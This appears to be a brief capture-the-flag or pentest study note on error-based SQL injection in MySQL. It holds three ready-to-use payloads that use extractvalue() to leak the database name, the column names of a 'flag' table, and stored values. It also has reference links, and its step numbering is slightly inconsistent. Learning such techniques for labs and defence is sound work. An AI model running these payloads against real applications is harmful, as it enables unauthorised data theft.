---
tags:
  - sql-injection/error-based
---
-- --


**Pre-requisites**

- Able to trigger  an XPATH Notation error

**Steps to reproduce**

1. Check for syntax error using `"` and `'` 

2. Use ``extractvalue()`` with `concat()` to generate a XPATH notation error

```SQL
%' and extractvalue("not-relevant", concat(0x0a, (select database()))); -- -
```

Change to  `limit 1,1` and so on the grab subsequent tables


4. Enumerate the Columns from the leaked database
```SQL
%' and extractvalue("not-relevant", concat(0x0a, (select column_name from information_schema.columns where table_name='flag' limit 0,1))); -- -
```

Change to  `limit 1,1` and so on the grab subsequent columns

5. Select a specific value from the database
```SQL
%' and extractvalue("not-relevant", concat(0x0a, (select name from flag limit 1))); -- -
```






### References

[portswigger/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
[sqlwiki/injection-types/error-based](https://sqlwiki.netspi.com/injectionTypes/errorBased/)
[mysql/xml-functions](https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html)
